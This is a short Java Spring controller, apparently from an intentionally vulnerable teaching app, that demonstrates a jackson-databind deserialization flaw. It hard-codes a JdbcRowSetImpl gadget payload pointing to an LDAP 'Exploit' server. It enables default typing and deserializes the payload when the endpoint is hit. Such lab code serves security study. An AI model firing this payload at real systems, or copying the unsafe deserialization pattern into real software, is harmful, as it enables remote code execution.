package com.best.hello.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/Jackson")
public class JacksonVul {

    /**
     * 影响版本：2.0.0 <= FasterXML jackson-databind < 2.9.10.4
     */
    @RequestMapping("/vul")
    public void vul() {
        try {
            String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";

            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            Object o = mapper.readValue(payload, Object.class);
            mapper.writeValueAsString(o);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
